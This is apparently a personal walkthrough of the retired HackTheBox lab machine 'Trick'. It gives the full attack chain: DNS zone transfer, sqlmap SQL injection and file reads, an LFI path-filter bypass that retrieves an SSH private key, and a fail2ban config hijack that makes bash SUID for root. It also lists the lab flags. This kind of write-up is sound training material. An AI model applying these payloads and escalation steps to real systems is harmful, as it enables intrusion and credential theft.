# HackTheBox — Trick

| Field | Details |
| --- | --- |
| Platform | HackTheBox |
| Challenge | Trick |
| Difficulty | Easy |
| OS | Linux (Debian 10 Buster) |
| IP | 10.129.227.180 |
| Date | October 2026 |
| User Flag | `919f0b217747f3cc092d8e0ce5186faa` |
| Root Flag | `33dc1bc9599f2951f805efc5dc76b040` |

---

## Challenge Summary

Trick chains DNS enumeration, SQL injection, local file inclusion, and a service-configuration privilege escalation. A reverse lookup identifies `trick.htb`, and an unrestricted DNS zone transfer exposes the payroll subdomain. SQL injection in its login form reveals a MySQL account with the `FILE` privilege, enabling file reads and discovery of a second, unlisted marketing vHost. The marketing application contains an LFI filtered with a non-recursive `str_replace("../", "")`. The `....//` bypass reads Michael's SSH private key. After SSH access, the `security` group can replace a fail2ban action configuration while sudo permits a service restart. Triggering a ban executes the malicious `actionban` as root and sets SUID on bash.

---

## Attack Chain Summary

```
Nmap TCP → SSH, SMTP, DNS, HTTP
dig -x → trick.htb
DNS AXFR → preprod-payroll.trick.htb
Payroll SQLi → MySQL FILE privilege
FILE read → Nginx config → preprod-marketing.trick.htb
Marketing LFI with ....// → /home/michael/.ssh/id_rsa
SSH as michael → user flag
security-group write access to fail2ban action.d
sudo fail2ban restart → malicious actionban
Trigger SSH ban → SUID /bin/bash → bash -p → root flag
```

---

## Step 1 — Nmap TCP Scan

```bash
Hackerpatel007_1@htb[/htb]$ nmap -sS -sV -sC -T4 -O -p 22,25,53,80 -Pn -oA Trick 10.129.227.180
```

```
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10
53/tcp open  domain  ISC BIND 9.11.5
80/tcp open  http    nginx 1.14.2
```

---

## Step 2 — DNS Enumeration

```bash
Hackerpatel007_1@htb[/htb]$ dig @10.129.227.180 -x 10.129.227.180
# → trick.htb
Hackerpatel007_1@htb[/htb]$ dig @10.129.227.180 axfr trick.htb
# → preprod-payroll.trick.htb
Hackerpatel007_1@htb[/htb]$ echo "10.129.227.180 trick.htb preprod-payroll.trick.htb" | sudo tee -a /etc/hosts
```

---

## Step 3 — SQL Injection on Payroll

```bash
Hackerpatel007_1@htb[/htb]$ sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login \
  --data="username=abc&password=abc" -p username \
  --level 5 --risk 3 --technique=BEUS --batch --privileges
```

```
[*] 'remo'@'localhost' [1]: privilege: FILE
```

---

## Step 4 — Read Files Through MySQL FILE Privilege

```bash
Hackerpatel007_1@htb[/htb]$ sqlmap ... --file-read=/etc/nginx/sites-enabled/default
```

```nginx
server_name preprod-marketing.trick.htb;
root /var/www/market;
fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
```

```bash
Hackerpatel007_1@htb[/htb]$ echo "10.129.227.180 preprod-marketing.trick.htb" | sudo tee -a /etc/hosts
```

---

## Step 5 — LFI Filter Bypass and SSH Key Extraction

`str_replace("../", "")` — bypassed with `....//`:

```
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//home/michael/.ssh/id_rsa
```

```bash
Hackerpatel007_1@htb[/htb]$ chmod 600 id_rsa && ssh -i id_rsa michael@10.129.227.180
michael@trick:~$ cat user.txt
919f0b217747f3cc092d8e0ce5186faa
```

---

## Step 6 — Privilege Escalation Enumeration

```bash
michael@trick:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)

michael@trick:~$ sudo -l
(root) NOPASSWD: /etc/init.d/fail2ban restart

michael@trick:~$ ls -ld /etc/fail2ban/action.d
drwxrwx--- 2 root security 4096 Jun 13 19:06 /etc/fail2ban/action.d
```

---

## Step 7 — fail2ban actionban Hijack

```bash
michael@trick:/etc/fail2ban/action.d$ mv iptables-multiport.conf .old
michael@trick:/etc/fail2ban/action.d$ cp .old iptables-multiport.conf
# Edit actionban line:
actionban = chmod u+s /bin/bash
michael@trick:/etc/fail2ban/action.d$ chmod 666 iptables-multiport.conf
michael@trick:/etc/fail2ban/action.d$ sudo /etc/init.d/fail2ban restart
```

Trigger SSH ban via repeated failed logins → fail2ban runs `actionban` as root:

```bash
michael@trick:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18 2019 /bin/bash

michael@trick:~$ bash -p
bash-5.0# id
uid=1001(michael) euid=0(root)
```

---

## Step 8 — Root Flag

```bash
bash-5.0# cat /root/root.txt
33dc1bc9599f2951f805efc5dc76b040
```

| Flag | Value |
| --- | --- |
| User | `919f0b217747f3cc092d8e0ce5186faa` |
| Root | `33dc1bc9599f2951f805efc5dc76b040` |

---

## Lessons Learned

- Run DNS checks whenever port 53 is exposed — AXFR can reveal internal vHosts.
- MySQL `FILE` privilege provides filesystem reads; Nginx config is a high-value target.
- PHP-FPM socket ownership changes the file-access context of LFI.
- `str_replace("../", "")` one-pass sanitisation is bypassed with `....//`.
- Directory write access allows replacement of root-owned config files inside it.

---

## Commands Reference

| Command | Purpose |
| --- | --- |
| `dig @<IP> -x <IP>` | Discover target domain via PTR |
| `dig @<IP> axfr trick.htb` | DNS zone transfer |
| `sqlmap ... --privileges` | Identify MySQL FILE privilege |
| `sqlmap ... --file-read=/etc/nginx/sites-enabled/default` | Extract vHost config |
| `index.php?page=....//....//....//....//....//home/michael/.ssh/id_rsa` | LFI filter bypass |
| `mv iptables-multiport.conf .old && cp .old iptables-multiport.conf` | Replace root-owned config via directory write |
| `sudo /etc/init.d/fail2ban restart` | Load modified fail2ban action |
| `bash -p` | Root SUID bash shell |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Detail |
| --- | --- | --- |
| Reconnaissance | T1590.002 | PTR lookup and AXFR zone transfer |
| Initial Access | T1190 | SQL injection and LFI |
| Credential Access | T1552.001 | SSH private key extracted via LFI |
| Lateral Movement | T1021.004 | SSH as Michael |
| Privilege Escalation | T1548.003 | NOPASSWD fail2ban restart |
| Privilege Escalation | T1548.001 | fail2ban set SUID on bash |

*HackTheBox retired machine — writeup published after official retirement.*
*Penetration Tester role in India | Target: January 2027*
